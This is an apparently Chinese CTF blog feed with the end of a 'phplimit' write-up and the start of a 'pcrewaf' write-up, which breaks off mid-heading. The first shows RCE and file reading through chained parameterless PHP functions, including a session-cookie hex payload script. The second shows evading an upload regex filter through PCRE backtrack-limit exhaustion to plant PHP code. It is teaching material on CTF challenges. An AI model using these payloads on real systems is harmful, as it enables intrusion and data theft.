id="寻找nginx函数"><a href="#寻找nginx函数" class="headerlink" title="寻找nginx函数"></a>寻找nginx函数</h2><p>那么现在思路又进一步变为：寻找nginx函数，以获取http headers<br>查阅php手册，并未发现相关可利用函数，于是此路终止。<br>那不能获取http headers怎么办？我们又该如何进行参数的传递？<br>这里我们可以转换一下思路，之间获取http headers，我们能获取非常多的属性，也就是说我们的可修改位置非常多，相当于一个面。但其实我们只要能够获取，并修改1条属性就够了，例如cookie或是X-Forward-For等等……<br>这样就相当于从寻找一个面变成寻找一个点，难以程度就会大幅下降。<br>那么最容易想到的应该就是cookie了</p><h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2><p>我们在php手册中，搜索cookie<br><img src="/images/2019-03-10-13-44-40.png" alt=""><br>我们点入session中，可以发现这样一个函数<br><img src="/images/2019-03-10-13-45-14.png" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_id ([ string $id ] ) : string</span><br></pre></td></tr></table></figure></p><p>session_id() 可以用来获取/设置当前会话 ID。<br>那么我们可以用此方法来获取phpsessionid，并且phpsessionid可控<br>但其有限制如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</span><br></pre></td></tr></table></figure></p><p>但问题不大，实际上我们只要拥有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0-9,a-f</span><br></pre></td></tr></table></figure></p><p>就够了，因为我们可以将16进制转字符串，例如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="keyword">print</span> <span class="string">'echo "sky cool";'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="number">6563686</span>f2022736b7920636f6f6c223b</span><br><span class="line">php &gt; <span class="keyword">eval</span>(hex2bin(<span class="string">'6563686f2022736b7920636f6f6c223b'</span>));</span><br><span class="line">sky cool</span><br></pre></td></tr></table></figure></p><p>我们可以看到，成功的执行命令<br>也就是说，我们只要使用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(hex2bin(session_id()));</span><br></pre></td></tr></table></figure></p><p>即可执行任意命令<br>但是当前题目并没有开启<code>session_start()</code><br>所以我们这里输入如下即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex2bin(session_id(session_start()))</span><br></pre></td></tr></table></figure></p><p>我们编写脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/?code=eval(hex2bin(session_id(session_start())));'</span></span><br><span class="line">payload = <span class="string">"echo 'sky cool';"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-10-14-00-08.png" alt=""><br>那么下面就是找flag即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"var_dump(scandir('./'));"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"index.php"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"var_dump(scandir('../'));"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">14</span>) <span class="string">"flag_phpbyp4ss"</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"html"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"var_dump(file_get_contents('../flag_phpbyp4ss'));"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">string(<span class="number">38</span>) <span class="string">"flag&#123;e86963ba34687d269b9faf526ce68cd7&#125;"</span></span><br></pre></td></tr></table></figure></p><p>最后可以成功getflag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e86963ba34687d269b9faf526ce68cd7&#125;</span><br></pre></td></tr></table></figure></p><h2 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h2><p>我们通过php session的控制，达成了RCE的目的，那么我们有没有其他类似的方法呢？<br>答案是肯定的，我们还可以通过我们传递的参数来进行RCE<br>有如下函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars()</span><br></pre></td></tr></table></figure></p><p>此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。<br>我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?code=var_dump(get_defined_vars());&amp;a=2</span><br></pre></td></tr></table></figure></p><p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [&quot;_GET&quot;]=&gt; array(2) &#123; [&quot;code&quot;]=&gt; string(29) &quot;var_dump(get_defined_vars());&quot; [&quot;a&quot;]=&gt; string(1) &quot;2&quot; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>那么如何将里面的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;a&quot;]=&gt; string(1) &quot;2&quot;</span><br></pre></td></tr></table></figure></p><p>提取出来呢？<br><img src="/images/2019-03-10-14-10-25.png" alt=""><br>这里有一系列提取位置的函数，我们首先使用<code>current()</code>函数<br>得到回显<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(current(get_defined_vars()));&amp;a=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="string">"code"</span>]=&gt; string(<span class="number">38</span>) <span class="string">"var_dump(current(get_defined_vars()));"</span> [<span class="string">"a"</span>]=&gt; string(<span class="number">1</span>) <span class="string">"2"</span> &#125;</span><br></pre></td></tr></table></figure></p><p>我们再取这个数组的最后一个<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(end(current(get_defined_vars())));&amp;a=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">string(<span class="number">1</span>) <span class="string">"2"</span></span><br></pre></td></tr></table></figure></p><p>即得到了回显。<br>那么后面就比较简单了，控制a进行RCE即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;a=phpinfo();</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-10-14-12-57.png" alt=""><br>然后getflag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;a=readfile(%27../flag_phpbyp4ss%27);</span><br></pre></td></tr></table></figure></p><p>即可拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e86963ba34687d269b9faf526ce68cd7&#125;</span><br></pre></td></tr></table></figure></p><h2 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h2><p>为什么一定要RCE呢？这个题既然flag放在文件里，我们能不能直接读文件就行？<br>之前的方法都基于可以进行RCE，可以说我们是把题目难度又加大了，实际上，我们只进行任意文件读取即可<br>那么想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？<br>首先，我们可以利用<code>getcwd()</code>获取当前目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(getcwd());</span><br><span class="line"></span><br><span class="line">string(13) &quot;/var/www/html&quot;</span><br></pre></td></tr></table></figure></p><p>那么怎么进行当前目录的目录遍历呢？<br>这里用<code>scandir()</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>那么既然不在这一层目录，如何进行目录上跳呢？<br>我们用<code>dirname()</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(dirname(getcwd())));</span><br><span class="line"></span><br><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>即可发现flag文件，那么问题又回到之前，如果取数组指定位置的值，我们需要取的位置是第3个，我们有的方法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">current() 取第一个</span><br><span class="line">next() 取第二个</span><br><span class="line">end() 取最后一个</span><br></pre></td></tr></table></figure></p><p>那么怎么取第三个呢？<br>我们这里让数组倒叙，然后取第二个即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(next(array_reverse(scandir(dirname(getcwd())))));</span><br><span class="line"></span><br><span class="line">string(14) &quot;flag_phpbyp4ss&quot;</span><br></pre></td></tr></table></figure></p><p>那么读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=file_get_contents(next(array_reverse(scandir(dirname(getcwd())))));</span><br><span class="line"></span><br><span class="line">Warning: file_get_contents(flag_phpbyp4ss): failed to open stream: No such file or directory in /var/www/html/index.php(3) : eval()&apos;d code on line 1</span><br></pre></td></tr></table></figure></p><p>发现报错了，我们找不到这个文件，因为没有<code>../</code>上跳呀，这该怎么办呢？<br>这里我们发现有函数可以更改当前目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir ( string $directory ) : bool</span><br></pre></td></tr></table></figure></p><p>将 PHP 的当前目录改为 directory。<br>所以我们这里在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname(getcwd())</span><br></pre></td></tr></table></figure></p><p>进行如下设置即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(dirname(getcwd()))</span><br></pre></td></tr></table></figure></p><p>这样我们的当前目录就在<code>/var/www</code>下了<br>但此时，我们的值变为了bool值，我们为了遍历目录，需要让他变回来，所以我们先进行目录上跳<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(dirname(chdir(dirname(getcwd()))));</span><br><span class="line"></span><br><span class="line">string(1) &quot;.&quot;</span><br></pre></td></tr></table></figure></p><p>再列目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(dirname(chdir(dirname(getcwd())))));</span><br><span class="line"></span><br><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>然后就回到了之前的问题了，我们直接取文件，读取即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p><p>即可拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e86963ba34687d269b9faf526ce68cd7&#125;</span><br></pre></td></tr></table></figure></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这种开放式的题目非常有趣，可以帮助我们了解许多php黑魔法和各种组合，我相信方法远不止这3种，欢迎各位讨论！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于合天智汇</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本次是phplimit这道题，本篇文章提供了3种解法，即如何利用无参数函数进行RCE/任意文件读取&lt;/p&gt;
&lt;h2 id=&quot;题目概述&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018 Code Breaking(2) &amp; pcrewaf</title>
    <link href="http://skysec.top/2019/03/10/2018-Code-Breaking-2-pcrewaf/"/>
    <id>http://skysec.top/2019/03/10/2018-Code-Breaking-2-pcrewaf/</id>
    <published>2019-03-10T04:59:06.000Z</published>
    <updated>2019-03-12T07:00:10.417Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>题目源码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>题目源码比较清晰，应该是一个上传问题，我们依次解读一下：<br>首先我们确定上传目录<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br></pre></td></tr></table></figure></p><p>然后我们上传的文件内容会被读取<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br></pre></td></tr></table></figure></p><p>紧接着内容会进入正则进行匹配,以判断我们上传的文件内容里是否有php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果带有phg代码，贼会打印<code>bad request</code><br>若不带有php代码，则会将我们的文件进行保存<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">$path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br></pre></td></tr></table></figure></p><p>然后在http返回头里给我们文件路径<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么现在思路应该很清晰了：题目并没有禁止我们上传php文件，但是对文件内容进行了过滤，禁止我们写入php代码。<br>所以现在的思路应该就是：bypass正则<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br></pre></td></tr></table></figure></p><p>上传php文件getshell</p><h2 id="正则分析"><a href="#正则分析" class="headerlink" title="正则分析"></a>正则分析</h2><p>当我们输入一个正常的php文件内容时<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们可以看到正则的全部流程如下<br>首先正则开始寻找<code>&lt;</code><br><img src="/images/2019-03-05-15-55-33.png" alt=""><br>找到<code>&lt;</code>后，然后正则再开始寻找<code>?</code><br><img src="/images/2019-03-05-15-55-43.png" alt=""><br>找到<code>&lt;?</code>后，正则开始匹配<code>.*</code><br><img src="/images/2019-03-05-15-55-54.png" alt=""><br>可以在step4中看到，正则因为<code>.*</code>匹配上了<code>&lt;?</code>后所有字符，但此时正则没有结束，又开始继续寻找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;]</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-05-15-56-03.png" alt=""><br>于是正则开始回溯，在末位找到<code>&gt;</code><br><img src="/images/2019-03-05-15-56-20.png" alt=""><br><img src="/images/2019-03-05-15-56-31.png" alt=""><br><img src="/images/2019-03-05-15-57-26.png" alt=""><br>所以这里的正则大致意思可以明确为，寻找<code>&lt;?</code>开头和<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;]</span><br></pre></td></tr></table></figure></p><p>结尾的字符串。<br>那么我们怎么绕过呢？<br>一般情况下，我们会思考能否绕过php tags<br>例如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&lt;%=</span><br><span class="line">&lt;%, %&gt;</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?</span>=</span><br></pre></td></tr></table></figure></p><p>那我们能否用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= phpinfo();</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>来绕过过滤呢？<br>答案显然是否定的，我们注意到题目的php版本号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Tue, 05 Mar 2019 08:19:19 GMT</span><br><span class="line">&lt; Server: Apache/2.4.25 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.1.26</span><br><span class="line">&lt; Vary: Accept-Encoding</span><br><span class="line">&lt; Content-Length: 3965</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure></p><p>这里是php7，我们观察到官方手册<br><img src="/images/2019-03-05-16-19-55.png" alt=""><br>在php7中，这些tags都已经被移除，我们无法靠这个方式去bypass正则，那么应该如何去解呢？</p><h2 id="php正则回溯法"><a href="#php正则回溯法" class="headerlink" title="php正则回溯法"></a>php正则回溯法</h2><p>这里要讲到ph牛的一篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</span><br></pre></td></tr></table></figure></p><p>个人感觉ph解析的非常到位，我这里简单概述一下<br>我们从上面的正则流程应该能看出一些端倪，在step3到step4的时候，正则匹配完整个字符串，但因为正则没有结束，所以从后往前开始回溯寻找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;]</span><br></pre></td></tr></table></figure></p><p>那么有没有可能我们让他一直回溯，一直难以找到，直到我们达成正则表达式的拒绝服务攻击（reDOS）呢？<br>我们不妨构造如下payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="comment">//skyskyskyskyskyskyskyskysky........sky</span></span><br></pre></td></tr></table></figure></p><p>（省略号代表n多sky）<br>这里一直到step3都是和之前一样，但从回溯开始就发生了变化：<br>首先我们结尾没有用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;]</span><br></pre></td></tr></table></figure></p><p>所以正则需要不断从后往前回溯，一直找到phpinfo()后的那个分号<br><img src="/images/2019-03-05-16-24-50.png" alt=""><br><img src="/images/2019-03-05-16-25-08.png" alt=""><br>我们可以看到正则匹配次数会随我们的sky增长而增长。<br>这样显然是不行的，因为我们的payload后的sky字符串可以无限延长，那么正则匹配次数不可能达到那么大的数值。所以它会不会有一个上限呢？<br>我们可以测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ php -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(ini_get(&apos;pcre.backtrack_limit&apos;));</span><br><span class="line">string(7) &quot;1000000&quot;</span><br></pre></td></tr></table></figure></p><p>可以发现次数为100万次，那么如果超过100万次会怎么样呢？<br>我们继续测试：<br>正常匹配成功情况下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, &apos;&lt;?php phpinfo(); //aaa&apos;));</span><br><span class="line">int(1)</span><br></pre></td></tr></table></figure></p><p>返回了1<br>正常匹配失败情况下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, &apos;2333333&apos;));</span><br><span class="line">int(0)</span><br></pre></td></tr></table></figure></p><p>回溯达到上限情况下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, &apos;&lt;?php phpinfo();//&apos;.str_repeat(&apos;a&apos;, 1000000)));</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure></p><p>我们发现返回了false</p><h2 id="漏洞点攻击"><a href="#漏洞点攻击" class="headerlink" title="漏洞点攻击"></a>漏洞点攻击</h2><p>既然我们发现达到回溯上限会返回false，我们再看一遍题目的正则<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以构造如下文本内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="comment">//'.str_repeat('a', 1000000)</span></span><br></pre></td></tr></table></figure></p><p>这样达到回溯上限后，is_php就会<code>return false</code><br>那么往下的if判断中得到的结果就会为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure></p><p>我们自然就避开了过滤，达到了文件上传的目的</p><h2 id="payload编写与getflag"><a href="#payload编写与getflag" class="headerlink" 